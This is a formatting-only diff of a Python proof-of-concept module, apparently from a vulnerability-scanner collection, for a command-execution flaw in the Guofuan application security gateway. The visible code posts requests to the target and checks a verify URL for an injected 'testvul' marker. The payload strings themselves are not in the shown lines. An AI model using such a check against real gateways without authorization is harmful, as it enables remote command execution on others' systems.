@@ -5,11 +5,12 @@ from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import re
 import random
 
+
 class Vuln(ABVuln):
-    vuln_id = 'Gfapki_0009' # 平台漏洞编号，留空
+    vuln_id = 'Gfapki_0009'  # 平台漏洞编号，留空
     name = '国富安应用安全网关命令执行'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.OTHER # 漏洞类型
+    type = VulnType.OTHER  # 漏洞类型
     disclosure_date = 'Unknown'  # 漏洞公布时间
     desc = '''
         国富安应用安全网关多处命令执行。
@@ -23,6 +24,7 @@ class Vuln(ABVuln):
     product = '国富安应用安全网关'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
 
+
 class Poc(ABPoc):
     poc_id = '9933fc05-c534-417d-a423-feb3dd541dd7'
     author = '47bwy'  # POC编写者
@@ -35,7 +37,7 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
+
             hh = hackhttp.hackhttp()
             arg = self.target
             content_type = 'Content-Type: application/x-www-form-urlencoded'
@@ -53,10 +55,11 @@ class Poc(ABPoc):
             for i in range(len(urls)):
                 url = urls[i]
                 post = posts[i]
-                code, head, res, err, _ = hh.http(url, post, header=content_type)
+                code, head, res, err, _ = hh.http(
+                    url, post, header=content_type)
                 if (code != 200) and (code != 302):
                     continue
-                #验证
+                # 验证
                 code, head, res, err, _ = hh.http(verify_url)
                 #print res
                 if (code == 200) and ('testvul'+str(i) in res):
@@ -69,6 +72,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
